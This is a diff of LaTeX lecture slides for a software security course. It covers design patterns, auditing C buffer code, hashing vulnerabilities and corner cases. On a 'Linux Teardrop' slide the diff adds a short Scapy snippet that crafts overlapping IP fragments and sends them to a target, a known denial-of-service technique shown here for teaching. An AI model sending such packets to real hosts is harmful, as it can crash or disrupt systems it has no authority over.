@@ -9,6 +9,20 @@
 {8. Program Building Blocks}
 {KEA Kompetence OB2 Software Security}
 
+
+\slide{Goals for today}
+
+\hlkimage{6cm}{thomas-galler-hZ3uF1-z2Qc-unsplash.jpg}
+
+Todays goals:
+\begin{list2}
+\item Talk about the Design Patterns concept
+\item Present some of the ones often found in programs
+\item Patterns can also be found in other areas, like Patterns in Network Architecture
+\end{list2}
+
+  Photo by Thomas Galler on Unsplash
+
 \slide{Plan for today}
 
 \begin{list1}
@@ -27,19 +41,10 @@
 \slide{Reading Summary}
 
 \begin{list1}
-\item \emph{Hacking, 2nd Edition: The Art of Exploitation}, Jon Erickson chapters 1-3
-\item If you have it 24-deadly chapters 5-8
+\item \emph{Gray Hat Hacking} chapters 1-2, 11-13 - browse if you need to, many pages.
 \end{list1}
 
-\slide{Goals: }
 
-\hlkimage{13cm}{ipv6-address-1.pdf}
-
-\begin{list1}
-\item Talk about the Design Patterns concept
-\item Present some of the ones often found in programs
-\item Patterns can also be found in other areas, like Patterns in Network Architecture
-\end{list1}
 
 \slide{Design Patterns}
 
@@ -72,9 +77,8 @@
 
 \slide{Auditing code patterns}
 
-
+Various pitfalls, and areas
 \begin{list2}
-\item Book describes various pitfalls, and areas
 \item {\bf Variable Relationship}
 \item Examples presented are C buffers
 \item A variable-pointer to the buffer and the variable with the length
@@ -127,7 +131,7 @@
 
 \begin{list2}
 \item Always make sure variables have well defined values.
-\item Defensive programs use memset to clear contents of buffers
+\item Defensive program above use memset to clear contents of buffers
 \item Example from Suricata allocating memory, checking it got the memory, clearing contents
 \end{list2}
 
@@ -151,22 +155,22 @@
 \slide{Linux Teardrop}
 
 \begin{minted}[fontsize=\footnotesize]{python}
-  size=36
-  offset=3
-  load1="\x00"*size
+#! /usr/bin/env python3
+if attack == '0':
+  print "Using attack 0"
+  size=36    offset=3   load1="\x00"*size
   i=IP()   i.dst=target   i.flags="MF"   i.proto=17
 
-  size=4
-  offset=18
-  load2="\x00"*size
-  j=IP()
-  j.dst=target   j.flags=0   j.proto=17   j.frag=offset
+  size=4     offset=18  load2="\x00"*size
+  j=IP()   j.dst=target   j.flags=0   j.proto=17   j.frag=offset
+  send(i/load1)
+  send(j/load2)
 \end{minted}
 
 \begin{list2}
 \item IP fragments, packets are split when crossing a link with lower MTU
 \item If fragments created by an attacker are overlapping it creates a problem
-\item Scapy example code by Sam Bowne can be found at:\\
+\item Scapy example code by Sam Bowne, full code can be found at:\\
 \url{https://samsclass.info/123/proj10/teardrop.htm}
 \item what is a Maximum Transmission Unit (MTU)\\
 See \url{https://en.wikipedia.org/wiki/Maximum_transmission_unit} for a description,\\ related/similar attack setting source=destination \url{https://en.wikipedia.org/wiki/LAND}
@@ -178,7 +182,6 @@ See \url{https://en.wikipedia.org/wiki/Maximum_transmission_unit} for a descript
 
 \begin{list2}
 \item Hashing algorithms
-\item Only mentioned briefly in the book
 \item There have been multiple problems with hashing algorithms
 \item Denial of Service and arbitrary code can be the result
 \item Example vulns from popular programming languages, others have similar!\\
@@ -242,7 +245,7 @@ if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
 \slide{Side effects, corner cases and 32-bit vs 64-bit}
 
 \begin{list2}
-\item Chapter lists a couple of corner cases
+%\item Chapter lists a couple of corner cases
 \item Functions can change variables in global scope while doing something
 \item Allocating memory can go wrong, check return values
 \item Asking for 0 bytes of memory is technically legal but may cause problems
@@ -332,25 +335,6 @@ Source:
 \item If you have bad security in some part - guess where attackers will end up
 \item Hackers are not required to take the hardest path into the network
 \item Realize there is no such thing as 100\% security
-\end{list1}
-
-
-\slide{First advice}
-
-\begin{list1}
-\item Use technology
-\item Learn the technology - read the freaking manual
-\item Think about the data you have, upload, facebook license?! WTF!
-\item Think about the data you create - nude pictures taken, where will they show up?
-\begin{list2}
-\item Turn off features you don't use
-\item Turn off network connections when not in use
-\item Update software and applications
-\item Turn on encryption: IMAP{\bf S}, POP3{\bf S},
-  HTTP{\bf S} also for data at rest, full disk encryption, tablet encryption
-\item Lock devices automatically when not used for 10 minutes
-\item Dont trust fancy logins like fingerprint scanner or face recognition on cheap devices
-\end{list2}
 \end{list1}
 
 
